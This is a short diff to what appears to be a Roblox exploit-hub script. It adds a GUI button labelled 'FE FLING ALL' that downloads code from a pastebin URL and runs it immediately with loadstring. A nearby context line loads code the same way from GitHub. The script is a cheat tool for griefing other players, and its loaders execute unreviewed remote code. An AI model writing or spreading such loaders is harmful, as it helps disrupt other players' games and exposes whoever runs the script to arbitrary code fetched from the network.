@@ -164,4 +164,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/KATERGaming/Roblox/ma
 print("Hello World!")
 end})
 
-
+Tab1:AddButton({"FE FLING ALL", function(Value)
+loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+print("Hello World!")
+end})
